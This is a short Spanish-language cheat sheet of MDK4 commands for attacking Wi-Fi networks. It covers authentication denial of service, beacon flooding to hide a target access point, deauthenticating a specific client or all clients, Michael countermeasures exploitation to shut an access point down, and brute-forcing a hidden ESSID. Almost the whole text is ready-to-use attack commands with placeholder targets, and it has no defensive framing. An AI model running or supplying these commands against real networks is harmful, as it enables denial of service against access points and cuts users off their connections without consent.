# MDK4 Cheat Sheet

#### Ataque: *'Authentication Denial-Of-Service'* 
- Generar varias direcciones MAC para asociarlas a la AP y volver lenta la red para que el AP expulse a todos los clientes.
```
mdk4 <INTERFACE> a -a <BSSID-AP>
```

#### Ataque: *'Beacon Flooding'* 
- Generar puntos de acceso aleatorios y diferentes nombres en el canal del AP.
```
mdk4 <INTERFACE> b -c <CHANNEL-AP>
```
- Generar Montones de puntos de accesos en el mismo canal que el punto de acceso objetivo. Con esto logramos que quede fuera de la onda de espectro y que no lo pueda visualizar el usuario el AP objetivo.
```
for i in $(seq 1 10); do echo "WifiFree$i" >> File.txt; done

mdk4 <INTERFACE> b -f File.txt -a -s 1000 -c <CHANNEL-AP>
```
- Generar puntos de acceso con un solo nombre en distintos canales:
```
mdk4 <INTERFACE> b -n <AP-NAME> b -w nta -m
```

#### Ataque: *'Deauthentication and Disassociation'* 
- Desautenticar a un cliente y usando la dirección MAC del cliente victima.
```
echo "1F:2B:31:AC:A2:64" > blacklist.txt

mdk4 <INTERFACE> d -w blacklist.txt -c <CHANNEL-AP>
```

#### Ataque: *'Michael Countermeasures Exploitation'* 
- Se puede llegar a apagar el AP con este ataque.
```
mdk4 <INTERFACE> m -t <BSSID-AP>
```

#### Ataque: *'Dehautentication Flooding'*
- Enviará paquetes de autenticación a todos y cada uno de los clientes conectados al AP especificado
```
mdk4 <INTERFACE> d -c <CHANNEL-AP> -E <ESSID-AP> -B <BSSID-AP>
```

#### Ataque: *'Fuerza bruta para obtener el ESSID oculto de un AP'*
```
mdk4 <INTERFACE> p -t <BSSID-AP> -f <WORDLIST>
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)